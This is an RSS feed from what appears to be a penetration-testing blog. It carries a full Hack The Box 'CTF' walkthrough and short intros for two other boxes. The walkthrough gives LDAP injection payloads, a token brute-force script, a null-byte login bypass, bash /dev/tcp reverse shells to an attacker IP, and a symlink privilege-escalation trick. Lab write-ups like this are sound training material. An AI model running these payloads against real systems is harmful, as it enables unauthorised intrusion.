<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Privilege-Escalation on VAPT Walkthroughs</title><link>https://malayamanas.github.io/tags/privilege-escalation/</link><description>Recent content in Privilege-Escalation on VAPT Walkthroughs</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 22 Sep 2025 09:15:00 +0000</lastBuildDate><atom:link href="https://malayamanas.github.io/tags/privilege-escalation/index.xml" rel="self" type="application/rss+xml"/><item><title>Reddish HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/reddish-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 09:15:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/reddish-htb-walkthrough/</guid><description>&lt;h1 id="reddish-htb---insane-linux-box-walkthrough"&gt;Reddish HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/Yp4oxoQIBAM?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="key-exploitation-steps-and-techniques-chronological-order"&gt;Key Exploitation Steps and Techniques (Chronological Order)&lt;/h2&gt;
&lt;p&gt;Below is a chronological extraction of the key exploitation steps and techniques used in the provided data for the &amp;ldquo;Reddish&amp;rdquo; box from Hack The Box, focusing on the process of gaining access and escalating privileges through multiple hops and pivoting techniques.&lt;/p&gt;</description></item><item><title>CTF HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/ctf-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 09:00:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/ctf-htb-walkthrough/</guid><description>&lt;h1 id="ctf-htb---insane-linux-box-walkthrough"&gt;CTF HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/51JQg202csw?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="key-exploitation-steps-and-techniques"&gt;Key Exploitation Steps and Techniques&lt;/h2&gt;
&lt;p&gt;Below is a chronological summary of the key exploitation steps and techniques used in the Hack The Box CTF challenge, as extracted from the provided data.&lt;/p&gt;
&lt;h3 id="1-initial-enumeration-with-nmap"&gt;1. Initial Enumeration with Nmap&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Network scanning using Nmap with default scripts and version enumeration.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Command&lt;/strong&gt;: &lt;code&gt;nmap -sC -sV -oA nmap/CTF [TARGET-IP]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Findings&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Port 22: SSH (OpenSSH 7.4)&lt;/li&gt;
&lt;li&gt;Port 80: HTTP (Apache httpd 2.4.6, CentOS)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Identify open ports, services, and operating system to understand the attack surface.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="2-web-server-exploration"&gt;2. Web Server Exploration&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Manual inspection of the web page hosted on port 80.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Navigated to &lt;code&gt;http://[TARGET-IP]&lt;/code&gt; in Firefox.&lt;/li&gt;
&lt;li&gt;Identified a login page requiring a username and one-time password (OTP).&lt;/li&gt;
&lt;li&gt;Noted warnings about brute-force protection and a &amp;ldquo;wall of sheep&amp;rdquo; listing banned IPs.&lt;/li&gt;
&lt;li&gt;Reviewed page source for hints, finding a reference to an 81-digit software token stored in an existing attribute.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Gather information about the web application and its authentication mechanism.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="3-testing-for-cross-site-scripting-xss"&gt;3. Testing for Cross-Site Scripting (XSS)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Attempted XSS by injecting HTML tags (e.g., &lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;) in the username field.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Result&lt;/strong&gt;: No response, indicating XSS filtering or lack of vulnerability.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Test for basic input validation weaknesses.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="4-double-url-encoding-attempt"&gt;4. Double URL Encoding Attempt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used Burp Suite to manipulate login requests with double URL encoding to bypass potential input filters.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Intercepted login request with Burp Suite.&lt;/li&gt;
&lt;li&gt;Encoded input (e.g., &lt;code&gt;username=test%3A%3B&lt;/code&gt;, &lt;code&gt;OTP=1234&lt;/code&gt;) and tested for bypass.&lt;/li&gt;
&lt;li&gt;Resulted in &amp;ldquo;user is not found,&amp;rdquo; suggesting blacklisting of certain characters.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Attempt to evade input validation or blacklisting mechanisms.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="5-research-on-software-tokens"&gt;5. Research on Software Tokens&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Researched software token implementations for Linux, focusing on the 81-digit token mentioned in the page source.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Findings&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Identified &lt;code&gt;stoken&lt;/code&gt; as a potential software token application (RSA SecurID 128-bit compliant).&lt;/li&gt;
&lt;li&gt;Noted that &lt;code&gt;stoken&lt;/code&gt; requires a seed and user information to generate tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Understand the authentication mechanism and its reliance on software tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="6-username-enumeration-with-wfuzz"&gt;6. Username Enumeration with wfuzz&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Brute-forced usernames using &lt;code&gt;wfuzz&lt;/code&gt; with a small username wordlist to avoid triggering brute-force protection.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Command&lt;/strong&gt;: &lt;code&gt;wfuzz -H -D &amp;quot;inputUsername=FUZZ&amp;amp;inputOTP=1234&amp;quot; -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt http://[TARGET-IP]/login.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Result&lt;/strong&gt;: No valid usernames found initially, as responses showed consistent 233 words (indicating &amp;ldquo;user not found&amp;rdquo;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Identify valid usernames for the login form.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="7-identifying-ldap-injection"&gt;7. Identifying LDAP Injection&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Tested special characters to identify blacklisted inputs and suspected LDAP injection due to specific character filtering (e.g., null byte, parentheses, wildcard, backslash).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Used &lt;code&gt;wfuzz&lt;/code&gt; with a special characters wordlist: &lt;code&gt;wfuzz -H -D &amp;quot;inputUsername=FUZZ&amp;amp;inputOTP=1234&amp;quot; -w /usr/share/seclists/Fuzzing/special-chars.txt http://[TARGET-IP]/login.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Identified blacklisted characters: null byte (&lt;code&gt;%00&lt;/code&gt;), open parenthesis (&lt;code&gt;%28&lt;/code&gt;), close parenthesis (&lt;code&gt;%29&lt;/code&gt;), wildcard (&lt;code&gt;%2A&lt;/code&gt;), backslash (&lt;code&gt;%5C&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Noted that a wildcard (&lt;code&gt;%2A&lt;/code&gt;) with username resulted in &amp;ldquo;cannot login&amp;rdquo; instead of &amp;ldquo;user not found,&amp;rdquo; suggesting a valid username or query success.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Confirm LDAP injection vulnerability due to specific character filtering patterns.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="8-ldap-username-discovery"&gt;8. LDAP Username Discovery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used LDAP injection with wildcard to brute-force username characters.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Ran &lt;code&gt;wfuzz&lt;/code&gt; with a character set (a-z) appended with wildcard: &lt;code&gt;wfuzz -H -D &amp;quot;inputUsername=FUZZ%252A&amp;amp;inputOTP=1234&amp;quot; -w /usr/share/seclists/Fuzzing/1-char.txt http://[TARGET-IP]/login.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Identified username by iteratively building it: &lt;code&gt;L&lt;/code&gt;, &lt;code&gt;LD&lt;/code&gt;, &lt;code&gt;LDA&lt;/code&gt;, &lt;code&gt;LDAP&lt;/code&gt;, &lt;code&gt;LDAPu&lt;/code&gt;, &lt;code&gt;LDAPus&lt;/code&gt;, &lt;code&gt;LDAPuse&lt;/code&gt;, &lt;code&gt;LDAPuser&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Validated username &lt;code&gt;LDAPuser&lt;/code&gt; with OTP &lt;code&gt;1234&lt;/code&gt;, resulting in &amp;ldquo;cannot login.&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Discover the valid username &lt;code&gt;LDAPuser&lt;/code&gt; through LDAP injection.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="9-ldap-attribute-enumeration"&gt;9. LDAP Attribute Enumeration&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used LDAP injection to enumerate valid attributes.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Crafted LDAP query: &lt;code&gt;LDAPuser%29%28FUZZ%3D%2A&lt;/code&gt; (translated to &lt;code&gt;LDAPuser)(FUZZ=*)&lt;/code&gt;) to enumerate attributes.&lt;/li&gt;
&lt;li&gt;Used &lt;code&gt;wfuzz&lt;/code&gt; with an LDAP attributes wordlist: &lt;code&gt;wfuzz -H -D &amp;quot;inputUsername=LDAPuser%29%28FUZZ%3D%2A&amp;amp;inputOTP=1234&amp;quot; -w attributes.txt http://[TARGET-IP]/login.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Identified valid attributes: &lt;code&gt;cn&lt;/code&gt;, &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;mail&lt;/code&gt;, &lt;code&gt;objectClass&lt;/code&gt;, &lt;code&gt;pager&lt;/code&gt;, &lt;code&gt;password&lt;/code&gt;, &lt;code&gt;sn&lt;/code&gt;, &lt;code&gt;uid&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Identify attributes in the LDAP schema, focusing on &lt;code&gt;pager&lt;/code&gt; as the likely storage for the 81-digit token.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="10-token-brute-forcing-with-python-script"&gt;10. Token Brute-Forcing with Python Script&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Developed a Python script to brute-force the 81-digit token stored in the &lt;code&gt;pager&lt;/code&gt; attribute.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Created &lt;code&gt;brute.py&lt;/code&gt; to automate LDAP injection for token enumeration.&lt;/li&gt;
&lt;li&gt;Script logic:
&lt;ul&gt;
&lt;li&gt;Iterated through digits (0-9) to build the token.&lt;/li&gt;
&lt;li&gt;Constructed LDAP query: &lt;code&gt;LDAPuser)(pager=tokenFUZZ*&lt;/code&gt; (e.g., &lt;code&gt;LDAPuser)(pager=28FUZZ*&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Sent POST requests to &lt;code&gt;http://[TARGET-IP]/login.php&lt;/code&gt; with Burp proxy.&lt;/li&gt;
&lt;li&gt;Checked for &amp;ldquo;cannot login&amp;rdquo; response to indicate a valid token prefix.&lt;/li&gt;
&lt;li&gt;Included sleep to avoid brute-force bans.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Output token after 81 iterations (noted a trailing incorrect character).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Script Content&lt;/strong&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; time &lt;span style="color:#f92672"&gt;import&lt;/span&gt; sleep
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; string &lt;span style="color:#f92672"&gt;import&lt;/span&gt; digits
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;http://[TARGET-IP]/login.php&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;proxy &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {&lt;span style="color:#e6db74"&gt;&amp;#34;http&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;http://localhost:8080&amp;#34;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;attribute &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;pager&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;token &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;loop &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; loop:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; digit &lt;span style="color:#f92672"&gt;in&lt;/span&gt; digits:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; query &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;LDAPuser)(&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;attribute&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;token&lt;span style="color:#e6db74"&gt;}{&lt;/span&gt;digit&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;*&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {&lt;span style="color:#e6db74"&gt;&amp;#34;inputUsername&amp;#34;&lt;/span&gt;: query, &lt;span style="color:#e6db74"&gt;&amp;#34;inputOTP&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;1234&amp;#34;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; response &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(url, data&lt;span style="color:#f92672"&gt;=&lt;/span&gt;data, proxies&lt;span style="color:#f92672"&gt;=&lt;/span&gt;proxy)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;stdout&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;token: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;token&lt;span style="color:#e6db74"&gt;}{&lt;/span&gt;digit&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;stdout&lt;span style="color:#f92672"&gt;.&lt;/span&gt;flush()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sleep(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;cannot login&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; response&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; token &lt;span style="color:#f92672"&gt;=&lt;/span&gt; token &lt;span style="color:#f92672"&gt;+&lt;/span&gt; digit
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;success: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;token&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sleep(&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;elif&lt;/span&gt; digit &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;9&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; loop &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Result&lt;/strong&gt;: Obtained an 81-digit token (82 characters with an incorrect trailing character).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Retrieve the software token required for authentication.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="11-time-synchronization-for-token-validation"&gt;11. Time Synchronization for Token Validation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used &lt;code&gt;stoken&lt;/code&gt; to generate OTP and synchronized system time to match the server.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Installed &lt;code&gt;stoken&lt;/code&gt; and ran: &lt;code&gt;stoken --token=&amp;lt;81-digit-token&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Noted requirement for a 4-8 digit PIN; used &lt;code&gt;0000&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Identified server time in response headers (e.g., 09:55 GMT).&lt;/li&gt;
&lt;li&gt;Disabled NTP: &lt;code&gt;timedatectl set-ntp 0&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Set local time: &lt;code&gt;date -s 1757&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Generated OTP and tested login with &lt;code&gt;LDAPuser&lt;/code&gt; and OTP, resulting in a command execution interface.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Generate a valid OTP by aligning client and server time.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="12-bypassing-group-membership-check"&gt;12. Bypassing Group Membership Check&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used LDAP injection with a null byte to bypass group membership check (&lt;code&gt;memberOf ADM&lt;/code&gt; or &lt;code&gt;root&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Crafted query: &lt;code&gt;LDAPuser%00&lt;/code&gt; to terminate the LDAP query early.&lt;/li&gt;
&lt;li&gt;Sent via Burp Suite, avoiding double URL encoding by the browser.&lt;/li&gt;
&lt;li&gt;Successfully logged in, receiving a command execution interface.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Gain command execution by bypassing LDAP query restrictions.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="13-command-execution-and-reverse-shell"&gt;13. Command Execution and Reverse Shell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Executed commands via the web interface and established a reverse shell.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Issued &lt;code&gt;whoami&lt;/code&gt; command, confirming &lt;code&gt;apache&lt;/code&gt; user.&lt;/li&gt;
&lt;li&gt;Attempted reverse shell: &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/[ATTACKER-IP]/9001 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Switched to port 443 due to firewall restrictions: &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/[ATTACKER-IP]/443 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Established reverse shell as &lt;code&gt;apache&lt;/code&gt; user.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Gain interactive shell access to the system.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="14-ssh-access-as-ldapuser"&gt;14. SSH Access as LDAPuser&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Used LDAP credentials found in &lt;code&gt;login.php&lt;/code&gt; to SSH into the box.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Inspected &lt;code&gt;login.php&lt;/code&gt; to find LDAP bind credentials: &lt;code&gt;LDAPuser&lt;/code&gt; and password.&lt;/li&gt;
&lt;li&gt;SSH command: &lt;code&gt;ssh LDAPuser@[TARGET-IP]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Successfully logged in and accessed &lt;code&gt;user.txt&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Gain a more stable shell with proper TTY support.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="15-privilege-escalation-via-backup-script"&gt;15. Privilege Escalation via Backup Script&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Exploited a backup script to read &lt;code&gt;root.txt&lt;/code&gt; via symbolic link manipulation.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Identified a cron job running &lt;code&gt;honeypot.sh&lt;/code&gt; every minute, creating 7z backups in &lt;code&gt;/backup&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Noted script used relative paths and a list file for archiving.&lt;/li&gt;
&lt;li&gt;As &lt;code&gt;apache&lt;/code&gt; user, created files in &lt;code&gt;/var/www/html/uploads&lt;/code&gt;:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;touch @pleasesub&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ln -s /root/root.txt /var/www/html/uploads/pleasesub&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Waited for cron job to run, which archived &lt;code&gt;root.txt&lt;/code&gt; contents into an error log due to access denial.&lt;/li&gt;
&lt;li&gt;Read the error log to extract the &lt;code&gt;root.txt&lt;/code&gt; hash.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Purpose&lt;/strong&gt;: Obtain the root flag without full root access.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="summary"&gt;Summary&lt;/h3&gt;
&lt;p&gt;The exploitation involved:&lt;/p&gt;</description></item><item><title>Fortune HTB - Insane OpenBSD Box Walkthrough</title><link>https://malayamanas.github.io/posts/fortune-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 08:45:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/fortune-htb-walkthrough/</guid><description>&lt;h1 id="fortune-htb---insane-openbsd-box-walkthrough"&gt;Fortune HTB - Insane OpenBSD Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/_BLd046r-co?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
